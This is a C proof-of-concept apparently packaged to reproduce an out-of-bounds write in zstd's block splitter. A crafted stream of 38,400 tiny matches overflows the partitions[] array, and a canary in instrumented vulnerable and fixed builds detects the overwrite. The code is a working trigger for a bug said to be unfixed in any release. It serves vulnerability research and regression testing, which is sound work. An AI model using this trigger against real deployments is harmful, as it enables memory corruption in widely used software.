/*
 * ZstdOverrun — out-of-bounds write in zstd's recursive block splitter.
 *
 * CVE-less / unreleased: fixed upstream in facebook/zstd commit 974238ca
 * ("Fix block splitter partition bounds", 2026-11-10), NOT in any release
 * (latest release v1.5.7 dates to 2025-02-18).
 *
 * The recursive ZSTD_deriveBlockSplitsHelper() writes split positions into
 * ZSTD_blockSplitCtx.partitions[] (ZSTD_MAX_NB_BLOCK_SPLITS == 196 U32 entries)
 * and only checks the budget on function entry. A left-child recursion can
 * therefore fill the whole 196-entry array before its ancestors write their own
 * split positions, so `splits->splitLocations[splits->idx] = midIdx` writes past
 * partitions[] into the adjacent `entropyMetadata` (and, in this instrumented
 * build, into the canary placed between them). A single crafted external
 * sequence stream (38,400 valid 3-byte matches) deterministically exhausts the
 * budget.
 *
 * Both binaries are the REAL libzstd (facebook/zstd) compiled from source with
 * musl-gcc. The ONLY change from upstream is the addition of an 8-word canary
 * field immediately after partitions[] in ZSTD_blockSplitCtx, so the out-of-
 * bounds WRITE is detected deterministically (ASAN is unavailable):
 *   - zstd-vuln : v1.5.7 (the latest release) — vulnerable
 *   - zstd-fixed: commit 974238ca (the upstream fix) — re-checks the budget and
 *                 adds one extra partition slot, so the canary is untouched
 *
 * Build/run: see run.sh.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ZSTD_STATIC_LINKING_ONLY   /* expose ZSTD_registerSequenceProducer & cParams */
#include "zstd.h"
#include "compress/zstd_compress_internal.h"   /* exposes ZSTD_CCtx.blockSplitCtx */

/* Mirror of the hash used by the upstream regression test (tests/fuzzer.c). */
static unsigned FUZ_blockSplitHash(unsigned x)
{
    x ^= x >> 16;
    x *= 0x7feb352dU;
    x ^= x >> 15;
    x *= 0x846ca68bU;
    return x ^ (x >> 16);
}

/*
 * External sequence producer that generates 38,400 valid 3-byte matches over a
 * 128,000-byte all-zero source. Every offset is a valid match into the zeroed
 * input, so (with ZSTD_c_validateSequences == 1) the stream is a valid parse;
 * the sheer number of small matches makes the recursive splitter produce more
 * than ZSTD_MAX_NB_BLOCK_SPLITS (196) splits, exhausting the partition budget.
 */
static size_t blockSplitSequenceProducer(
    void* state,
    ZSTD_Sequence* out, size_t capacity,
    const void* src, size_t srcSize,
    const void* dict, size_t dictSize,
    int compressionLevel, size_t windowSize)
{
    size_t i;
    (void)state; (void)src; (void)dict; (void)dictSize;
    (void)compressionLevel; (void)windowSize;

    if (srcSize != 128000) return (size_t)-1;
    if (capacity < 38401) return (size_t)-1;

    for (i = 0; i < 38400; ++i) {
        unsigned const code = 3 + FUZ_blockSplitHash((unsigned)(i / 150)) % 10;
        out[i].offset    = (1U << code) + (unsigned)(i % 4);
        out[i].litLength = (i == 0) ? 12800 : 0;
        out[i].matchLength = 3;
        out[i].rep = 0;
    }
    memset(out + i, 0, sizeof(*out));
    return i + 1;
}

#define CANARY_WORDS 8
#define CANARY_VALUE 0xA5A5A5A5u

int main(void)
{
    size_t const srcSize = 128000;
    size_t const dstCap  = ZSTD_compressBound(srcSize);
    unsigned char* const src = (unsigned char*)calloc(1, srcSize);
    unsigned char* const dst = (unsigned char*)malloc(dstCap);
    ZSTD_CCtx* const cctx = ZSTD_createCCtx();
    size_t cSize;
    unsigned i;
    int clobbered = 0;

    if (!src || !dst || !cctx) { fprintf(stderr, "alloc failed\n"); return 2; }

    /* Same parameters as the upstream regression test test_blockSplitLimit(). */
    if (ZSTD_isError(ZSTD_CCtx_setParameter(cctx, ZSTD_c_compressionLevel, 19)) ||
        ZSTD_isError(ZSTD_CCtx_setParameter(cctx, ZSTD_c_minMatch, 3)) ||
        ZSTD_isError(ZSTD_CCtx_setParameter(cctx, ZSTD_c_splitAfterSequences, ZSTD_ps_enable)) ||
        ZSTD_isError(ZSTD_CCtx_setParameter(cctx, ZSTD_c_validateSequences, 1)))
    {
        fprintf(stderr, "setParameter failed\n");
        return 2;
    }
    ZSTD_registerSequenceProducer(cctx, NULL, blockSplitSequenceProducer);

    /* Arm the canary that sits between partitions[] and entropyMetadata. */
    for (i = 0; i < CANARY_WORDS; ++i)
        cctx->blockSplitCtx.canary[i] = CANARY_VALUE;

    cSize = ZSTD_compress2(cctx, dst, dstCap, src, srcSize);
    if (ZSTD_isError(cSize)) {
        fprintf(stderr, "compress2 failed: %s\n", ZSTD_getErrorName(cSize));
        return 2;
    }

    /* Did the block splitter write past partitions[] into the canary? */
    for (i = 0; i < CANARY_WORDS; ++i) {
        if (cctx->blockSplitCtx.canary[i] != CANARY_VALUE) {
            printf("  canary[%u] = 0x%08x (was 0x%08x)\n",
                   i, cctx->blockSplitCtx.canary[i], CANARY_VALUE);
            clobbered = 1;
        }
    }

    printf("compressed %zu -> %zu bytes\n", srcSize, cSize);
    if (clobbered) {
        printf("ZSTDOVERRUN-CANARY-CLOBBERED: the block splitter wrote past "
               "partitions[196] into adjacent context state\n");
        return 1;   /* exploit marker: memory corruption observed */
    }
    printf("ZSTDOVERRUN-CANARY-INTACT: no out-of-bounds write\n");

    ZSTD_freeCCtx(cctx);
    free(dst);
    free(src);
    return 0;
}
